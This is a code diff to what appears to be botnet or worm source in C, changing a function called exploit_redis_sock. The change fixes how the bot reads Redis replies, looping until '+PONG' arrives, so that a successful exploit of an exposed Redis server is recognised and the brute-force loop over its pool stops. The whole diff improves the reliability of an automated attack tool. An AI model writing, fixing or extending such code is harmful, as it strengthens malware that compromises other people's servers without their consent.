@@ -1182,22 +1182,32 @@ int exploit_redis_sock(notnet_bot_t *bot, int sock) {
         return -1;
     }
 
-    /* Read response */
+    /* Read response. Redis replies to each pipelined command separately
+     * (+OK +OK +OK +OK +PONG); over a network those arrive as multiple
+     * segments, so a SINGLE recv() can catch only the first +OK and miss
+     * the trailing +PONG — reporting a successful exploit as failed and
+     * making the brute-force loop continue through the whole pool.
+     * Loop with select() until +PONG is seen or the 2s timeout expires. */
     char resp[256];
-    fd_set fds;
-    struct timeval tv;
-    FD_ZERO(&fds);
-    FD_SET(sock, &fds);
-    tv.tv_sec = 2;
-    tv.tv_usec = 0;
-
+    memset(resp, 0, sizeof(resp));
+    size_t got = 0;
     int success = 0;
-    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
-        recv(sock, resp, sizeof(resp) - 1, 0);
-        resp[sizeof(resp) - 1] = '\0';
-        /* Check for "+PONG" response indicating SAVE succeeded */
+    time_t deadline = time(NULL) + 2;
+    while (time(NULL) < deadline && got + 1 < sizeof(resp)) {
+        fd_set fds;
+        struct timeval tv;
+        FD_ZERO(&fds);
+        FD_SET(sock, &fds);
+        tv.tv_sec = 2;
+        tv.tv_usec = 0;
+        if (select(sock + 1, &fds, NULL, NULL, &tv) <= 0) break;
+        int n = recv(sock, resp + got, sizeof(resp) - 1 - got, 0);
+        if (n <= 0) break;
+        got += (size_t)n;
+        resp[got] = '\0';
         if (strstr(resp, "+PONG")) {
             success = 1;
+            break;
         }
     }
 
